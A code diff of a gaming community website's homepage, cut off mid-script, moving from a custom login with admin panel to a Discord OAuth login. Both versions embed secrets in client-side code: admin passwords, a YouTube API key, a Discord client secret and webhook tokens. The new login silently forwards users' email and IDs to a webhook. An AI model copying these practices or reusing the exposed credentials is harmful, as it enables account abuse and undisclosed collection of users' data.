@@ -1,421 +1,486 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Aafat Gaming</title>
-  <link rel="icon" href="logo.png" />
-  <style>
-    :root{
-      --neon: #39ff14;
-      --glass: rgba(0,0,0,0.6);
-      --glass-strong: rgba(0,0,0,0.85);
-    }
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      color:#fff;
-      background: url("https://media.giphy.com/media/yiHVzPd8GklnOQGkEk/giphy.gif") center/cover fixed no-repeat;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-      min-height:100vh;
-      display:flex;
-      flex-direction:column;
-    }
-    .container{width:100%;max-width:1100px;margin:0 auto;padding:16px;}
-    .navbar{
-      display:flex;align-items:center;justify-content:space-between;
-      gap:12px;padding:12px;border-radius:10px;
-      background: linear-gradient(90deg, rgba(0,0,0,0.85), rgba(0,0,0,0.6));
-      box-shadow: 0 6px 30px rgba(0,0,0,0.6);
-      border: 1px solid rgba(57,255,20,0.08);
-      margin:12px;
-      backdrop-filter: blur(6px);
-    }
-    .brand{display:flex;align-items:center;gap:12px}
-    .brand img{width:52px;height:52px;border-radius:50%;border:2px solid var(--neon)}
-    .brand .title{font-weight:700;color:var(--neon);text-shadow:0 0 10px var(--neon);font-size:1.2rem}
-    .nav-links{display:flex;gap:10px;align-items:center}
-    .nav-links a{color:#fff;text-decoration:none;padding:6px 10px;border-radius:6px;font-weight:600}
-    .nav-links a:hover{color:var(--neon); text-shadow:0 0 10px var(--neon)}
-    .btn{background:transparent;border:1px solid rgba(255,255,255,0.08);color:#fff;padding:8px 12px;border-radius:8px;cursor:pointer}
-    .btn.neon{background:var(--neon);color:#000;border:none;font-weight:700}
-    .hero{margin:14px;border-radius:12px;padding:20px;background:linear-gradient(180deg, rgba(0,0,0,0.55), rgba(0,0,0,0.4));box-shadow:0 10px 30px rgba(0,0,0,0.6);border:1px solid rgba(57,255,20,0.06)}
-    h1{font-size:1.8rem;margin:6px 0;color:var(--neon);text-shadow:0 0 8px var(--neon)}
-    p.lead{color:#ddd;margin-top:6px}
-    /* sections */
-    .section{margin:16px;border-radius:12px;padding:18px;background:var(--glass);border:1px solid rgba(57,255,20,0.06)}
-    .flex{display:flex;gap:12px;align-items:center}
-    .center{text-align:center}
-    /* live frame */
-    .video-wrap{width:100%;max-width:980px;margin:0 auto;border-radius:12px;overflow:hidden;border:2px solid var(--neon)}
-    .video-wrap iframe{width:100%;height:540px;border:0;display:block}
-    /* announcements */
-    .announcement{background:rgba(0,0,0,0.45);border-left:3px solid var(--neon);padding:12px;border-radius:8px;margin:8px 0}
-    /* small forms */
-    input[type="text"], input[type="password"], textarea{
-      width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:#fff;
-    }
-    label{font-size:0.9rem;color:#ddd}
-    .row{display:flex;gap:10px;flex-wrap:wrap}
-    .col{flex:1;min-width:180px}
-    footer{margin-top:auto;padding:18px;border-top:1px solid rgba(57,255,20,0.06);background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.6));display:flex;justify-content:center;gap:18px}
-    footer img{width:34px;height:34px;filter:drop-shadow(0 0 8px rgba(57,255,20,0.1))}
-    /* responsive */
-    @media (max-width:900px){
-      .video-wrap iframe{height:260px}
-      .brand .title{font-size:1rem}
-      .navbar{flex-direction:column;align-items:flex-start;gap:10px}
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Aafat Gaming</title>
+<!-- Google Fonts for a modern neon look -->
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" />
+
+<!-- Font Awesome for social icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+<style>
+  /* Reset */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  /* Body with background and overlay */
+body {
+  font-family: 'Orbitron', sans-serif;
+  height: 100vh;
+  background-image: url('https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2lwaHNkaDk0dDZ5dzFsdnh1anM0cmo1NGpxc2x6ZWlxamNwMWFmbSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/6FmWneK9CsoumzFsqZ/giphy.gif'); /* Replace with your background link */
+  background-size: cover;
+  background-position: center;
+  position: relative;
+  color: #fff;
+}
+
+body::before {
+  content: "";
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background-color: rgba(0, 0, 0, 0.5); /* Overlay for contrast */
+  z-index: 0;
+}
+
+/* Container for content */
+.container {
+  position: relative;
+  z-index: 1;
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+}
+
+/* Header styles */
+.header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 20px;
+  position: relative;
+  z-index: 2;
+  background: rgba(0, 0, 0, 0.2);
+}
+
+/* Logo in circle with glow */
+.logo {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  overflow: hidden;
+  box-shadow: 0 0 20px rgba(0,255,255,0.6); /* subtle glow */
+  border: 3px solid #0ff;
+  background-color: transparent;
+  cursor: pointer;
+}
+
+.logo img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+/* Navigation buttons */
+.nav-buttons {
+  display: flex;
+  gap: 15px;
+}
+
+.nav-buttons a {
+  color: #0ff;
+  text-decoration: none;
+  font-weight: 500;
+  padding: 8px 12px;
+  border-radius: 5px;
+  transition: all 0.2s;
+}
+
+.nav-buttons a:hover {
+  background-color: rgba(0, 255, 255, 0.2);
+}
+
+/* Profile button and modal */
+.profile-section {
+  position: relative;
+  margin-right: 20px;
+}
+
+.profile-btn {
+  background: none;
+  border: 2px solid #0ff;
+  padding: 8px 16px;
+  border-radius: 20px;
+  cursor: pointer;
+  color: #0ff;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+
+.profile-btn:hover {
+  background-color: rgba(0, 255, 255, 0.2);
+}
+
+/* Profile modal */
+#profileModal {
+  display: none;
+  position: absolute;
+  top: 100%;
+  right: 0;
+  background-color: rgba(0,0,0,0.8);
+  padding: 15px;
+  border-radius: 8px;
+  margin-top: 10px;
+  width: 250px;
+  z-index: 3;
+  font-size: 14px;
+}
+
+#profileModal h3 {
+  margin-bottom: 10px;
+  color: #0ff;
+}
+
+#profileModal p {
+  margin: 5px 0;
+  word-wrap: break-word;
+}
+
+/* Main content area */
+.main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 20px;
+  z-index: 1;
+  position: relative;
+  font-size: 2em
+}
+
+/* Announcement Section */
+.announcement-section {
+  width: 80%;
+  max-width: 800px;
+  margin: 20px auto;
+  padding: 15px;
+  background-color: rgba(0,0,0,0.4);
+  border-radius: 10px;
+  text-align: center;
+  font-size: 1.2em;
+  position: relative;
+}
+
+/* Announcement display text */
+#announcementText {
+  margin-bottom: 10px;
+}
+
+/* Set Announcement Button (logo button) */
+.set-announcement-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background: none;
+  border: 2px solid #0ff;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s;
+}
+
+.set-announcement-btn:hover {
+  background-color: rgba(0, 255, 255, 0.2);
+}
+
+/* Input box for new announcement */
+#announcementInput {
+  width: 100%;
+  padding: 8px;
+  font-size: 1em;
+  border-radius: 5px;
+  border: none;
+  margin-top: 10px;
+  display: none; /* Hidden by default */
+}
+
+/* Buttons for save/cancel */
+#announcementButtons {
+  margin-top: 10px;
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+  display: none; /* Hidden by default */
+}
+#announcementButtons button {
+  padding: 8px 16px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 0.2s;
+}
+#announcementButtons button:hover {
+  opacity: 0.8;
+}
+
+#saveBtn {
+  background-color: #0ff;
+  color: #000;
+}
+#cancelBtn {
+  background-color: #f00;
+  color: #fff;
+}
+
+/* Social media buttons */
+.social-buttons {
+  margin-top: 30px;
+  display: flex;
+  gap: 20px;
+  flex-wrap: wrap;
+}
+
+/* Specific colors for each social media icon */
+.social-buttons a.youtube {
+  color: red;
+}
+.social-buttons a.discord {
+  color: #0d6efd; /* blue */
+}
+.social-buttons a.whatsapp {
+  color: green;
+}
+.social-buttons a.instagram {
+  color: #ff00e1;
+}
+.social-buttons a:hover {
+  box-shadow: 0 0 10px currentColor;
+  transform: scale(1.1);
+}
+
+@media(max-width: 600px) {
+  .nav-buttons {
+    flex-direction: column;
+    align-items: flex-end;
+  }
+  .social-buttons {
+    justify-content: center;
+  }
+}
+</style>
 </head>
 <body>
 
-  <div class="navbar container" role="navigation" aria-label="Main">
-    <div class="brand">
-      <!-- logo -->
-      <img id="logoImg" src="https://media.giphy.com/media/yiHVzPd8GklnOQGkEk/giphy.gif" alt="Aafat Gaming Logo">
-      <div>
-        <div class="title">Aafat Gaming</div>
-        <div style="font-size:0.8rem;color:#bbb">Neon • Gammy • Aafat</div>
-      </div>
+<div class="container">
+  <!-- Header with logo and navigation -->
+  <div class="header">
+    <!-- Logo in circle -->
+    <div class="logo" title="Logo (Click for Announcement)">
+      <img src="https://media.giphy.com/media/yiHVzPd8GkInOQGkEk/giphy.gif" alt="Aafat Gaming Logo" />
+    </div>
+    
+    <!-- Navigation buttons -->
+    <div class="nav-buttons">
+      <a href="index.html">HOME</a>
+      <a href="about.html">ABOUT US</a>
+      <a href="media.html">MEDIA</a>
+      <a href="rule.html">RULES</a>
+      <a href="game.html">GAMES</a>
+      <a href="server.html">SERVER</a>
+      <a href="apply.html">APPLY</a>
     </div>
 
-    <div style="display:flex;gap:12px;align-items:center">
-      <div class="nav-links" id="navLinks">
-        <!-- Only home shown initially -->
-        <a href="#home" id="homeNav">Home</a>
+    <!-- Profile Button -->
+    <div class="profile-section">
+      <button class="profile-btn" id="discordLogin">Login with Discord</button>
+      <div id="profileModal">
+        <h3>Profile Details</h3>
+        <p><strong>Name:</strong> <span id="name">-</span></p>
+        <p><strong>User Mention:</strong> <span id="mention">-</span></p>
+        <p><strong>User ID:</strong> <span id="userId">-</span></p>
+        <p><strong>Phone Number:</strong> <span id="phone">-</span></p>
+        <p><strong>Email ID:</strong> <span id="email">-</span></p>
       </div>
-
-      <!-- Login button for regular users -->
-      <button class="btn neon" id="openLoginBtn">Login</button>
-
-      <!-- Settings/Admin button (reveals admin login modal) -->
-      <button class="btn" id="openAdminBtn">Settings</button>
     </div>
   </div>
 
-  <!-- HERO / HOME -->
-  <main class="container">
-    <section class="hero center" id="home">
-      <h1>Welcome to Aafat Gaming 🎮</h1>
-      <p class="lead">Join the squad — watch live streams, read announcements and compete in tournaments. Login to see everything.</p>
-      <div style="margin-top:12px">
-        <button class="btn neon" id="ctaLogin">Login to Enter</button>
-      </div>
-    </section>
+  <!-- Announcement Section -->
+  <div class="announcement-section" id="announcementSection">
+    <div id="announcementText">Welcome to Aafat Gaming! Stay tuned for updates.</div>
+    <!-- Logo button to set/edit announcement -->
+    <div class="set-announcement-btn" id="setAnnouncementBtn" title="Set Announcement">
+      <i class="fas fa-pencil-alt"></i>
+    </div>
+    <!-- Input for new announcement, hidden initially -->
+    <input type="text" id="announcementInput" placeholder="Enter new announcement..." />
+    <!-- Save and Cancel buttons -->
+    <div id="announcementButtons">
+      <button id="saveBtn">Save</button>
+      <button id="cancelBtn">Cancel</button>
+    </div>
+  </div>
 
-    <!-- LIVE (hidden until user login) -->
-    <section class="section center" id="liveSection" style="display:none">
-      <h2 style="color:var(--neon)">🎥 Live Stream</h2>
-      <div class="video-wrap" id="videoWrap">
-        <iframe id="liveFrame" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-      </div>
-    </section>
+  <!-- Main Content -->
+  <div class="main">
+    <h1>Welcome to Aafat Gaming</h1>
+    <p><img src="https://cdn.discordapp.com/emojis/599508540083929098.gif?size=96&quality=lossless" alt="🔥" width="40" height="40">Unleash your skills, dominate every battle, and rise beyond limits.<img src="https://cdn.discordapp.com/emojis/599508540083929098.gif?size=96&quality=lossless" alt="🔥" width="40" height="40"></p>
+    <p><img src="https://cdn.discordapp.com/emojis/1428414003343921333.gif?size=96&quality=lossless" alt="🔥" width="40" height="40">Enter the arena where gamers become legends!<img src="https://cdn.discordapp.com/emojis/1428414003343921333.gif?size=96&quality=lossless" alt="🔥" width="40" height="40"></p>
+    <div class="social-buttons">
+      <a class="youtube" href="https://youtube.com/@mafiaaafat?si=-6uo5L9ii27XErY8" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+      <a class="instagram" href="https://www.instagram.com/ig_aafatyt?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a>
+      <a class="discord" href="https://discord.gg/MDEDDM92r5" target="_blank" title="Discord"><i class="fab fa-discord"></i></a>
+      <a class="whatsapp" href="https://wa.me/" target="_blank" title="WhatsApp"><i class="fab fa-whatsapp"></i></a>
+    </div>
+  </div>
+</div>
 
-    <!-- ANNOUNCEMENTS (hidden until login) -->
-    <section class="section" id="annSection" style="display:none">
-      <h2 style="color:var(--neon)">📢 Announcements</h2>
-      <div id="annList">
-        <!-- Dynamic list -->
-      </div>
-    </section>
-
-    <!-- Admin-only announcement composer (hidden until admin login) -->
-    <section class="section" id="adminPanel" style="display:none">
-      <h3 style="color:var(--neon)">⚙️ Admin — Post Announcement</h3>
-      <div style="max-width:900px">
-        <label>Announcement text</label>
-        <textarea id="announceText" rows="3" placeholder="Write announcement..." ></textarea>
-        <div style="display:flex;gap:8px;margin-top:8px">
-          <button class="btn neon" id="postAnnBtn">Post Announcement</button>
-          <button class="btn" id="adminLogoutBtn">Admin Logout</button>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <footer>
-    <a href="https://youtube.com" target="_blank" rel="noopener"><img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube"></a>
-    <a href="https://discord.com" target="_blank" rel="noopener"><img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" alt="Discord"></a>
-    <a href="https://instagram.com" target="_blank" rel="noopener"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram"></a>
-    <a href="https://wa.me/" target="_blank" rel="noopener"><img src="https://cdn-icons-png.flaticon.com/512/733/733585.png" alt="WhatsApp"></a>
-  </footer>
-
-  <!-- LOGIN / ADMIN MODALS (very simple) -->
-  <div id="modalRoot" aria-hidden="true"></div>
-
+<!-- Discord OAuth Script -->
 <script>
-/* ---------------------------
-   CONFIG (from the data you gave)
-   --------------------------- */
-const CONFIG = {
-  ADMIN_ID: "Manu-Node_7x",
-  ADMIN_PASS: "AG!89",
+  // Replace these with your Discord application's details
+  const CLIENT_ID = '1434242083425878086'; // <-- Insert your Client ID here
+  const REDIRECT_URI = 'https://aafatgaming.fun/'; // <-- Insert your redirect URI
+  const SCOPE = 'identify email';
 
-  // YouTube
-  YT_API_KEY: "AlzaSyCWpWeii8qnBNJsl4IOQ1sWn-dy-bZuuXU",
-  YT_CHANNEL_ID: "UC3OpDrKArRJ5Jryn3U8Fdew",
+  // Webhook URL - replace with your actual webhook URL
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1436807166441947326/TDsteagPEvUWZ6doblqvalWHKmafWGrdMsguSz_XBITklWx6uy-p6WpjUO2HBcefkkSC';
 
-  // Discord OAuth stuff you provided (not used here directly, just kept)
-  DISCORD_CLIENT_ID: "1434242083425878086",
-  DISCORD_CLIENT_SECRET: "xt7ZWPfnXeUR-MGZRGRfagnDzwuqICA0",
-  DISCORD_REDIRECT: "https://advyash.github.io/dekhte-hain/",
-
-  // Assets
-  LOGO_URL: "https://media.giphy.com/media/yiHVzPd8GklnOQGkEk/giphy.gif",
-  BACKGROUND_URL: "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXZvZXIqcHImbm05enNsM2gzNmo5dTR4cjVhY3duN2RoeWtndnVnMyZlcD12MV9naWZzX3NIYXJjaCZjdD1n/U3qYN8S0j3bpK/giphy.gif",
-
-  // Webhooks you provided (embedded client-side per your request)
-  LOGIN_WEBHOOK: "https://discord.com/api/webhooks/14368071664441947326/TDsteagPEvUWZ6doblqvalWHKmafWGrdMgsuSz_XBITklWx6uy-p6WpjUO2HBcefk kSC".replace(/ /g,''), // trimmed whitespace if any
-  ANNOUNCE_WEBHOOK: "https://discord.com/api/webhooks/14368081026990164746/pso0_7znzIcGfGtAh330yqOm bnVARhOEbaevMmmhet9NTj259BMgJ0wtb035UYyL5K_j".replace(/ /g,'')
-};
-
-/* Apply logo/background */
-document.getElementById('logoImg').src = CONFIG.LOGO_URL;
-document.body.style.backgroundImage = `url('${CONFIG.BACKGROUND_URL}')`;
-
-/* Simple in-memory announcements (persist to localStorage so reloads keep them) */
-let announcements = JSON.parse(localStorage.getItem('aafat_announcements') || '[]');
-function renderAnnouncements(){
-  const container = document.getElementById('annList');
-  container.innerHTML = '';
-  if(announcements.length===0){
-    const el = document.createElement('div'); el.className='announcement'; el.textContent='No announcements yet.';
-    container.appendChild(el);
-    return;
-  }
-  announcements.slice().reverse().forEach(a=>{
-    const el = document.createElement('div'); el.className='announcement';
-    const meta = document.createElement('div'); meta.style.fontSize='0.8rem'; meta.style.color='#ccc';
-    meta.textContent = `${a.by} • ${new Date(a.time).toLocaleString()}`;
-    const text = document.createElement('div'); text.style.marginTop='6px'; text.textContent = a.text;
-    el.appendChild(meta); el.appendChild(text);
-    container.appendChild(el);
+  document.getElementById('discordLogin').addEventListener('click', () => {
+    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${encodeURIComponent(SCOPE)}`;
+    window.location.href = oauthUrl;
   });
-}
-renderAnnouncements();
 
-/* ---------------------------
-   Helper: send webhook embed to Discord
-   POST body per Discord webhook format
-   --------------------------- */
-async function sendDiscordWebhook(url, payload){
-  try{
-    await fetch(url, {
-      method:'POST',
-      headers:{ 'Content-Type':'application/json' },
-      body: JSON.stringify(payload)
-    });
-  }catch(e){
-    console.warn('Webhook send failed', e);
-  }
-}
+  // Function to send data to Discord webhook
+  function sendToDiscordWebhook(userData) {
+    const avatarUrl = userData.avatar 
+      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
+      : 'https://cdn.discordapp.com/embed/avatars/0.png'; // default avatar if none
 
-/* ---------------------------
-   USER LOGIN (regular users)
-   - user provides display name, optional profile image URL, optional discord id to mention
-   - when logged in: show full site, post login embed to LOGIN_WEBHOOK
-   --------------------------- */
-function openUserLogin(){
-  const modal = document.createElement('div');
-  Object.assign(modal.style,{position:'fixed',inset:0,display:'flex',alignItems:'center',justifyContent:'center',background:'rgba(0,0,0,0.7)',zIndex:9999});
-  modal.innerHTML = `
-    <div style="background:var(--glass-strong);padding:18px;border-radius:12px;border:1px solid rgba(57,255,20,0.06);width:90%;max-width:420px">
-      <h3 style="margin:0 0 8px;color:var(--neon)">User Login</h3>
-      <label>Display name</label><input id="ui_name" type="text" placeholder="Your name (required)" />
-      <label>Profile image URL (optional)</label><input id="ui_avatar" type="text" placeholder="Image URL for webhook avatar" />
-      <label>Discord ID to mention (optional)</label><input id="ui_disc" type="text" placeholder="Discord numeric ID (optional)" />
-      <div style="display:flex;gap:8px;margin-top:10px;justify-content:flex-end">
-        <button id="uiCancel" class="btn">Cancel</button>
-        <button id="uiLogin" class="btn neon">Login</button>
-      </div>
-    </div>
-  `;
-  document.body.appendChild(modal);
-  document.getElementById('uiCancel').onclick = ()=>modal.remove();
-  document.getElementById('uiLogin').onclick = async ()=>{
-    const name = document.getElementById('ui_name').value.trim();
-    const avatar = document.getElementById('ui_avatar').value.trim() || null;
-    const discordId = document.getElementById('ui_disc').value.trim() || null;
-    if(!name){ alert('Please enter a display name'); return; }
-    modal.remove();
-    doUserLogin({name,avatar,discordId});
-  };
-}
-
-/* Perform the login UI -> show full site and send webhook */
-async function doUserLogin({name, avatar, discordId}){
-  // show nav items
-  const nav = document.getElementById('navLinks');
-  nav.innerHTML = `
-    <a href="#home">Home</a>
-    <a href="#rules">Rules</a>
-    <a href="#apply">Apply</a>
-    <a href="#games">Games</a>
-    <a href="#profile">Profile</a>
-    <a href="#" id="logoutLink">Logout</a>
-  `;
-  document.getElementById('logoutLink').addEventListener('click', ()=>location.reload());
-
-  // reveal sections
-  document.getElementById('liveSection').style.display='block';
-  document.getElementById('annSection').style.display='block';
-
-  // fetch and embed YT live video
-  await fetchLiveStream();
-
-  // create a simple user id for local purposes
-  const userId = 'UID_' + Math.random().toString(36).slice(2,10);
-
-  // send Discord login webhook embed
-  const loginTime = new Date().toISOString();
-  const embed = {
-    title: "User Logged In",
-    color: 5814783,
-    timestamp: loginTime,
-    author: {
-      name: name,
-      icon_url: avatar || 'https://cdn.discordapp.com/embed/avatars/0.png'
-    },
-    fields: [
-      { name: "User ID", value: userId, inline: true },
-      { name: "Login Time (local)", value: new Date().toLocaleString(), inline: true },
-      { name: "Mention (if provided)", value: discordId ? `<@${discordId}>` : '—', inline: false }
-    ]
-  };
-
-  // If admin wants mention in message field, include content
-  const payload = {
-    embeds: [embed],
-    content: discordId ? `Hey <@${discordId}>, you just logged in.` : ''
-  };
-
-  // Send webhook
-  if(CONFIG.LOGIN_WEBHOOK) sendDiscordWebhook(CONFIG.LOGIN_WEBHOOK, payload);
-
-  // Personalize UI (small profile area)
-  const profileEl = document.createElement('div');
-  profileEl.style.marginTop='10px';
-  profileEl.style.display='flex';
-  profileEl.style.alignItems='center';
-  profileEl.style.gap='10px';
-  profileEl.innerHTML = `<img src="${avatar || 'https://cdn.discordapp.com/embed/avatars/0.png'}" style="width:48px;height:48px;border-radius:8px;border:2px solid var(--neon)"><div><strong>${name}</strong><div style="font-size:0.85rem;color:#ddd">${userId}</div></div>`;
-  document.querySelector('.hero').appendChild(profileEl);
-}
-
-/* ---------------------------
-   ADMIN LOGIN / ANNOUNCE
-   - ADMIN ID / PASS checked client-side against CONFIG.ADMIN_ID / ADMIN_PASS
-   - On success show adminPanel; posting an announcement updates the list and sends ANNOUNCE_WEBHOOK
-   --------------------------- */
-function openAdminLogin(){
-  const modal = document.createElement('div');
-  Object.assign(modal.style,{position:'fixed',inset:0,display:'flex',alignItems:'center',justifyContent:'center',background:'rgba(0,0,0,0.7)',zIndex:9999});
-  modal.innerHTML = `
-    <div style="background:var(--glass-strong);padding:18px;border-radius:12px;border:1px solid rgba(57,255,20,0.06);width:90%;max-width:420px">
-      <h3 style="margin:0 0 8px;color:var(--neon)">Admin Login</h3>
-      <label>Admin ID</label><input id="adm_id" type="text" placeholder="Admin ID" />
-      <label>Admin Password</label><input id="adm_pass" type="password" placeholder="Password" />
-      <div style="display:flex;gap:8px;margin-top:10px;justify-content:flex-end">
-        <button id="admCancel" class="btn">Cancel</button>
-        <button id="admLogin" class="btn neon">Login</button>
-      </div>
-    </div>
-  `;
-  document.body.appendChild(modal);
-  document.getElementById('admCancel').onclick = ()=>modal.remove();
-  document.getElementById('admLogin').onclick = async ()=>{
-    const id = document.getElementById('adm_id').value.trim();
-    const pass = document.getElementById('adm_pass').value.trim();
-    if(id===CONFIG.ADMIN_ID && pass===CONFIG.ADMIN_PASS){
-      modal.remove();
-      activateAdminUI(id);
-    } else {
-      alert('Invalid admin credentials');
-    }
-  };
-}
-
-function activateAdminUI(adminName){
-  // reveal admin panel
-  document.getElementById('adminPanel').style.display='block';
-  // add admin meta to admin panel
-  const metaDiv = document.createElement('div');
-  metaDiv.style.fontSize='0.9rem'; metaDiv.style.color='#ddd'; metaDiv.style.marginTop='8px';
-  metaDiv.textContent = `Signed in as ${adminName}`;
-  document.getElementById('adminPanel').insertBefore(metaDiv, document.getElementById('adminPanel').firstChild.nextSibling);
-
-  // Post announcement click handler
-  document.getElementById('postAnnBtn').onclick = async () => {
-    const text = document.getElementById('announceText').value.trim();
-    if(!text){ alert('Enter announcement text'); return; }
-    const ann = { by: adminName, text: text, time: new Date().toISOString() };
-    announcements.push(ann);
-    localStorage.setItem('aafat_announcements', JSON.stringify(announcements));
-    renderAnnouncements();
-    document.getElementById('announceText').value='';
-
-    // Send announcement webhook embed
-    const payload = {
-      embeds: [{
-        title: "New Announcement",
-        description: text,
-        color: 15548997,
-        timestamp: new Date().toISOString(),
-        footer: { text: `Posted by ${adminName}` }
-      }]
+    const embed = {
+      title: "New User Profile",
+      description: `User has logged in via Discord`,
+      color: 0x00ffff,
+      fields: [
+        { name: "Name", value: userData.username + '#' + userData.discriminator, inline: true },
+        { name: "User ID", value: userData.id, inline: true },
+        { name: "Mention", value: `<@${userData.id}>`, inline: false },
+        { name: "Email", value: userData.email || 'N/A', inline: false },
+        { name: "Phone", value: 'N/A', inline: false }
+      ],
+      thumbnail: {
+        url: avatarUrl
+      }
     };
-    if(CONFIG.ANNOUNCE_WEBHOOK) sendDiscordWebhook(CONFIG.ANNOUNCE_WEBHOOK, payload);
-  };
 
-  document.getElementById('adminLogoutBtn').onclick = () => {
-    document.getElementById('adminPanel').style.display='none';
-  };
-}
-
-/* ---------------------------
-   Fetch live stream from YouTube Data API (search for live event on channel)
-   Requires YT_API_KEY and YT_CHANNEL_ID in CONFIG
-   --------------------------- */
-async function fetchLiveStream(){
-  // Attempt to find an active live stream for the given channel
-  if(!CONFIG.YT_API_KEY || !CONFIG.YT_CHANNEL_ID) return;
-  try{
-    const url = `https://www.googleapis.com/youtube/v3/search?part=snippet&channelId=${CONFIG.YT_CHANNEL_ID}&eventType=live&type=video&key=${CONFIG.YT_API_KEY}`;
-    const res = await fetch(url);
-    if(!res.ok){ console.warn('YT API not ok', res.status); return; }
-    const data = await res.json();
-    if(data.items && data.items.length>0){
-      const vid = data.items[0].id.videoId;
-      document.getElementById('liveFrame').src = `https://www.youtube.com/embed/${vid}`;
-    } else {
-      // no live stream, load channel page as fallback
-      document.getElementById('videoWrap').innerHTML = `<div style="padding:40px;color:#ddd">No live stream right now.</div>`;
-    }
-  }catch(e){
-    console.warn('YT fetch error', e);
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] }),
+    });
   }
-}
 
-/* ---------------------------
-   UI wiring
-   --------------------------- */
-document.getElementById('openLoginBtn').addEventListener('click', openUserLogin);
-document.getElementById('ctaLogin').addEventListener('click', openUserLogin);
-document.getElementById('openAdminBtn').addEventListener('click', openAdminLogin);
+  // Parse URL fragment for access token
+  function parseHashParams() {
+    const hash = window.location.hash.substring(1);
+    const params = {};
+    hash.split('&').forEach((item) => {
+      const [key, value] = item.split('=');
+      params[key] = decodeURIComponent(value);
+    });
+    return params;
+  }
 
-/* Populate initial announcements from your provided defaults if none exist */
-if(announcements.length===0){
-  announcements = [
-    { by: 'System', text: '🎮 Tournament starts at 8 PM tonight!', time: new Date().toISOString() },
-    { by: 'System', text: '🔥 New game added: Valorant', time: new Date().toISOString() }
-  ];
-  localStorage.setItem('aafat_announcements', JSON.stringify(announcements));
-  renderAnnouncements();
-}
+  // Fetch profile after redirect
+  window.onload = () => {
+    const params = parseHashParams();
+    if (params.access_token) {
+      fetch('https://discord.com/api/users/@me', {
+        headers: {
+          Authorization: `Bearer ${params.access_token}`,
+        },
+      })
+      .then(res => res.json())
+      .then(data => {
+        // Fill profile info
+        document.getElementById('name').textContent = data.username + '#' + data.discriminator;
+        document.getElementById('mention').textContent = `<@${data.id}>`;
+        document.getElementById('userId').textContent = data.id;
+        document.getElementById('phone').textContent = 'N/A'; // Discord API doesn't provide phone
+        document.getElementById('email').textContent = data.email || 'N/A';
 
+        // Send data to Discord webhook
+        sendToDiscordWebhook(data);
+
+        // Show profile modal
+        document.getElementById('profileModal').style.display = 'block';
+
+        // Remove token from URL
+        window.history.replaceState({}, document.title, window.location.pathname);
+      });
+    }
+
+    // Toggle profile modal on button click
+    const profileBtn = document.getElementById('discordLogin');
+    const modal = document.getElementById('profileModal');
+
+    profileBtn.addEventListener('click', () => {
+      if (modal.style.display === 'block') {
+        modal.style.display = 'none';
+      } else {
+        modal.style.display = 'block';
+      }
+    });
+  };
 </script>
+
+<!-- Script for Announcement Handling -->
+<script>
+  const correctPassword = 'admin123'; // Set your password here
+  const announcementTextDiv = document.getElementById('announcementText');
+  const announcementInput = document.getElementById('announcementInput');
+  const setAnnBtn = document.getElementById('setAnnouncementBtn');
+  const announcementButtons = document.getElementById('announcementButtons');
+  const saveBtn = document.getElementById('saveBtn');
+  const cancelBtn = document.getElementById('cancelBtn');
+
+  // When clicking the logo button
+  setAnnBtn.addEventListener('click', () => {
+    const password = prompt('Enter password to set announcement:');
+    if (password === correctPassword) {
+      // Show input box with current announcement
+      announcementInput.value = announcementTextDiv.innerText;
+      announcementInput.style.display = 'block';
+      announcementButtons.style.display = 'flex';
+      // Hide the display text
+      announcementTextDiv.style.display = 'none';
+    } else {
+      alert('Incorrect password!');
+    }
+  });
+
+  // Save new announcement
+  document.getElementById('saveBtn').addEventListener('click', () => {
+    const newAnn = announcementInput.value.trim();
+    if (newAnn !== '') {
